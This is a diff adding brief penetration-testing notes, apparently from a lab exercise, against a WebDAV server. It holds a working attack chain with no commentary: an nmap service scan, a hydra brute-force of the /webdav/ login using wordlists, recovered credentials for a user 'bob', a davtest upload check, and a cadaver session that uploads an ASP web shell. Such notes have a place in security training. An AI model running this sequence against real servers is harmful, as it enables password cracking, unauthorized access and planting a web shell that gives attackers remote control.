@@ -1,0 +1,11 @@
+nmap -sV -p 80 --script=http-enum "IP" 
+
+hydra -L /usr/share/wordlist/metasploit/common_users.txt -P /usr/share/wordlist/metasploit/common_passwords.txt "IP" http-get /webdav/
+
+user:bob
+pass:password_123321
+
+davtest -auth bob:password_123321 -url http://"IP"/webdav
+
+cadaver http://"IP"/webdav
+dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
